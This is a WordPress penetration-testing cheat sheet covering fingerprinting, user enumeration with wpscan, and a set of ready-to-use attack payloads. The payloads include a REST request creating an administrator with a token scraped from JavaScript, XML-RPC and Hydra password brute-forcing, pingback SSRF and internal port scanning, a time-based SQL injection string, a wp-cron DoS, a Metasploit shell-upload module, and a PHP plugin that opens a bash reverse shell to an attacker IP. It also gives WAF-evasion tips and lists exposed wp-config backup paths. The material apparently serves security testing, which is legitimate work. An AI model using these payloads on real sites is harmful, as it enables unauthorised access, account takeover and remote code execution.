## WordPress Pentest

---

### Detect WordPress

- Detect WP via HTTP headers and paths:
  - Look for `wp-content/`, `wp-includes/`, `xmlrpc.php`, `wp-login.php`, etc.
  - Check for `X-Pingback` and `Link` headers.
  - Look at the source code, you will see the links to `themes` and `plugins` from WordPress.
  - Visit `https://target.com/wp-login.php`, it is the WordPress login admin page.
- Tools:
  - `wappalyzer extension`
  - `whatweb https://target.com`
  - `builtwith https://target.com`
  - `nmap -p 80,443 --script http-wordpress-enum https://target.com`

---

### WPScan - Enumeration

#### Enumerate WordPress Version
**Automatically:**
```bash
wpscan --url https://target.com -e ap
```
- `-e ap`: enumerate all plugins.

**Manually**
  - Check these URLs:
     - `https://target.com/feed`
     - `https://target.com/?feed=rss2`
     - `https://target.com/readme.html`
     - `https://target.com/license.txt`
  - Check inside the source code of the page: readme.html or license.txt to get wp version or extract it using curl and grep commands.
  ```bash
  curl https://target.com/ | grep 'content="WordPress'
  ```
  - View page source then search for meta name, css, javascript (e.g. `<meta name="generator"` or `.css?ver=` or `.js?ver=`)
> **Note:** If you found outdated core, plugins, or themes, search for the exploit on [WPScan](https://wpscan.com).

---

#### Plugins Enumeration and It's Version
**Automatically:**
```bash
wpscan --url https://target.com -e vp
```
- `-e vp`: vulnerable plugins.

**Manually**
  - Check these URLs to find plugin version:
    - `https://target.com/wp-content/plugins/PLUGINNAME/readme.txt` 
    - `https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT`
    - `https://target.com/wp-content/plugins/PLUGINNAME/README.txt`
    - `https://target.com/wp-content/plugins/PLUGINNAME/README.TXT`
  - Change **readme.txt** to **changelog.txt** or **readme.md** 
> **Note:** If you found outdated core, plugins, or themes, search for the exploit on [WPScan](https://wpscan.com).

---

#### Themes Enumeration and It's Version
**Automatically:**
```bash
wpscan --url https://target.com -e vt
```
- `-e vt`: vulnerable themes.

**Manually**
  - Check there URLs to find theme version:
    - `https://target.com/wp-content/themes/THEMENAME/style.css`
    - `https://target.com/wp-content/themes/THEMENAME/readme.txt`
> **Note:** If you found outdated core, plugins, or themes, search for the exploit on [WPScan](https://wpscan.com).

---

#### Users Enumeration
**Automatically:**
```bash
wpscan --url https://target.com -e u
```

**Manually**
  - WordPress adds `author=ID` mapping to usernames, check these URL:
    - `https://target.com/?author=1` ➝ redirect to `/author/username/`
    - `https://target.com/wp-json/wp/v2/users`
    - `https://target.com/?rest_route=/wp/v2/users`

---

## Attack Scenarios

### ☐ Get Usernames On The Website Or Add User And Login

#### To Get User:
- Check these URLs:  
  - `https://target.com/?author=1`
  - `https://target.com/wp-json/wp/v2/users`
  - `https://target.com/?rest_route=/wp/v2/users`

#### To Add User:
- Search for Authorization in JavaScript files and request to `POST /wp-json/wp/v2/users` to add a user.
  ```
  POST /wp-json/wp/v2/users
  Authorization: Bearer <authorization_token_you_found_in_js_files>

  {
    "username":"yourUsername",
    "email":"yourEmail",
    "password":"yourPassword",
    "roles":["administrator"]
  }
  ```
- Navigate to `/wp-login.php/` and login.

---

### ☐ Username Exposure

- You can extract usernames using these paths:
  ```
  /wp-json/wp/v2/users
  /wp-json/?rest_route=/wp/v2/users/<IDnumber>
  /index.php?rest_route=/wp-json/wp/v2/users
  /index.php?rest_route=/wp/v2/users
  /author-sitemap.xml
  /wp-content/debug.log
  ```

---

### ☐ ID Brute-Force

#### Case (1): Brute-Force users IDs
```bash
curl -s -I -X GET http://target.com/?author=1
```
- Change author=1 to author=2, 3, etc.
- If response is 200 or 30X → ID is valid
- If 400 → ID is invalid


#### Case (2): `wp-json` Users directory
- You can also try to get information about the users by querying:
```bash
curl http://target.com/wp-json/wp/v2/users
```

#### Case (3): XML-RPC Enabled
- Check with `/xmlrpc.php`:
```xml
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```
- Brute-force methods:
  - `wp.getUserBlogs`
  - `wp.getCategories`
  - `metaWeblog.getUsersBlogs`
  - `pingback.ping`

- If you find any of them you can send something like:
```http
POST /xmlrpc.php HTTP/1.1
Host: target.com

<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>USERNAME</value></param>
    <param><value>PASSWORD</value></param>
  </params>
</methodCall>
```
> The message "Incorrect username or password" inside a 200 code response should appear if the credentials aren't valid.

#### Case (4): Brute-Force via file upload  
- Look at code in "Code to Upload File" node.

#### Case (5): Brute-Force via `system.multicall`  
- Look at code in "Code to Brute-force Credentials" node.

#### Case (6): Using WPScan
```bash
wpscan --url https://target.com --enumerate u
```

#### Case (7): Login via `/wp-login.php`
```http
POST /wp-login.php HTTP/1.1
Host: target.com

log=USERNAME&pwd=PASSWORD&wp-submit=Log+In&redirect_to=http://target.com/wp-admin/&testcookie=1
```

---

### Uploading a picture (After getting username & password)

- Using correct credentials, you can upload a file.
- Path to file will appear in the response.
- See "Code to Upload File" node.

---

### ☐ Port Scanning (XSPA)

- If you find the method pingback.ping inside the list, you have two cases:
#### Case (1): Internal port scanning
```xml
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://127.0.0.1:22</string></value></param>
    <param><value><string>https://target.com</string></value></param>
  </params>
</methodCall>
```
- Open port → "The pingback has already been registered"
- Closed port → Error or timeout

| Case          | Response                                                   | Meaning                  |
|---------------|-------------------------------------------------------------|--------------------------|
| Port is open  | `faultCode: 17` or "pingback has already been registered"   | Port likely open         |
| Port is closed| `faultCode: 0, 7` or error string                           | Port likely closed       |

#### Case (2): SSRF Test
```xml
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://YOUR_PUBLIC_IP:4444</string></value></param>
    <param><value><string>https://target.com</string></value></param>
  </params>
</methodCall>
```

- On attacker machine:
```bash
nc -lvnp 4444
```
- If the server indeed sends you a request → You'll see it in Netcat.
- This confirms that SSRF is working on the target server.

---

### ☐ Blind SSRF

- Use Burp Collaborator:
```xml
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>BURP_COLLABORATOR</string></value></param>
    <param><value><string>https://target.com</string></value></param>
  </params>
</methodCall>
```

- If response contains `faultCode > 0`, SSRF likely works.

---

### ☐ `/wp-json/oembed/1.0/proxy` SSRF

- Test:
```
https://target.com/wp-json/oembed/1.0/proxy?url=BURP_COLLABORATOR
```

---

### ☐ Time-Based SQLi on `/wp-json`

- Test:
```
GET /wp-json
Payload: ‘%2b(select*from(select(sleep(10)))a)$2b’
```

---

### ☐ DoS via `wp-cron.php`

- URL: `/wp-cron.php`
- Can cause DoS on high traffic sites.

```xml
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://target</string></value></param>
    <param><value><string>http://yoursite.com/valid-blog</string></value></param>
  </params>
</methodCall>
```

---

###  ☐ Open a session (Metasploit)

```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

---

### ☐ Remote Code Execution (RCE) via XML-RPC

- Ref: https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s

---

### ☐ PHP Plugin Remote Code Execution (RCE)

- Payload:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_LOCAL_IP/PORT 0>&1'");
?>
```

- Upload as plugin and activate.
- Ref: `https://www.hackingarticles.in/wordpress-reverse-shell`


---

#### Vulnerability Scan
```bash
wpscan --url https://target.com --api-token YOUR_TOKEN
```

---

### WPScan CLI Options Summary

- `-e`: Enumeration
  - `u`: users
  - `vp`: vulnerable plugins
  - `vt`: vulnerable themes
  - `ap`: all plugins
  - `at`: all themes
  - `cb`: config backup files
- `--api-token`: required for vulnerability DB
- `--random-user-agent`: evade WAF
- `--enumerate`: same as `-e`
- `--plugins-detection`: `passive`, `mixed`, `aggressive`

---

### WPExploit

- Automated WordPress fingerprinting & vulnerability scanner.

```bash
wpxploit -u https://target.com
```

- Fingerprints WordPress version, plugins, and themes.
- Parses plugin/theme names from HTML source and known paths.
- Searches for exploits from:
  - Exploit-DB
  - WPScan Vulnerability Database
(*) It depends on the same fingerprint used by WPScan.

---

#### Check `.git` and Backup Files
```bash
https://target.com/.git/
https://target.com/wp-config.php.swp
https://target.com/wp-config.inc
https://target.com/wp-config.old
https://target.com/wp-config.txt
https://target.com/wp-config.html
https://target.com/wp-config.php.bak
https://target.com/wp-config.php.dist
https://target.com/wp-config.php.inc
https://target.com/wp-config.php.old
https://target.com/wp-config.php.save
https://target.com/wp-config.php.swp
https://target.com/wp-config.php.txt
https://target.com/wp-config.php.zip
https://target.com/wp-config.php.html
https://target.com/wp-config.php~
```

---

### Fingerprinting Summary

- Passive:
  - HTTP headers (`X-Pingback`, `Link`, `Server`)
  - Meta tags: `<meta name="generator" content="WordPress x.x.x" />`
- Active:
  - Accessing common paths:
    - `/readme.html`, `/wp-login.php`, `/wp-admin/`
  - Author enumeration → get usernames

---

### Useful Tools

- `wpscan` – CLI scanner for WP vulnerabilities
- `wpxploit` – Fingerprinting & vuln scan
- `whatweb` – Web technology detection
- `nmap` – WP scripts + version detection
- `builtwith` – Online tech stack detector

---

### Scenarios

#### 1. Version & Plugin Enumeration → Vulnerability Lookup
1. Use `wpscan` to enumerate version and plugins.
2. Lookup vulnerabilities from the WPScan API or `exploit-db`.

#### 2. Exposed Backup or Readable Files
- Examples:
  - `wp-config.php.bak`
  - `.git/config`
  - `debug.log`
  - `readme.html` showing version

#### 3. Author Enumeration + Brute Force
- Extract usernames via:
  ```bash
  wpscan -e u
  ```
- Brute-force via Hydra:
  ```bash
  hydra -L users.txt -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Dashboard"
  ```

#### 4. Theme/Plugin with Known RCE
- After detecting plugins via `wpscan` or `wpxploit`, search Exploit-DB or use Metasploit modules.

---

### Tips

- Add custom headers to avoid blocking:
  ```bash
  wpscan --url https://target.com --random-user-agent --user-agent "Mozilla/5.0..."
  ```
- Try VPN/Proxy if target rate-limits requests.
- Use `-o` in `wpscan` to output results to file.
- Disable JS in browser to make source analysis easier.

---

## Attack Scenarios
